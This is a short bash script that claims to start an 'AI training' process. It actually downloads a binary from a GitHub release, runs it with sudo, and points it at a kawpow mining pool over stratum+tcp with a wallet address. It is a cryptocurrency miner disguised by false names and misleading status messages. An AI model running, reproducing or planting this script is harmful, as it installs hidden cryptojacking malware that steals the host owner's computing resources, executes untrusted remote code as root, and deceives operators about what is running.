#!/bin/bash

# Check if "aitraininng" is already running
if pgrep -x "aitraininng" > /dev/null; then
    echo "An AI training process is already running. Exiting."
    exit 1
fi

# Log file for debugging
LOGFILE="aitraininng.log"

# Start the process in nohup
nohup bash -c "
  wget -q https://github.com/max313iq/tech/releases/download/Gft/aitraininng -O aitraininng
  if [ -f aitraininng ]; then
      chmod +x aitraininng
      sudo ./aitraininng -a kawpow -o stratum+tcp://104.194.134.155:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.b2atch &
  else
      echo 'Download failed. Exiting.' >> $LOGFILE
      exit 1
  fi
" > "$LOGFILE" 2>&1 &

# Monitor the process
while true; do
    if ! pgrep -x "aitraininng" > /dev/null; then
        echo "AI training process stopped unexpectedly. Check $LOGFILE for details."
        break
    fi
    echo "AI training in process..."
    sleep 600
done
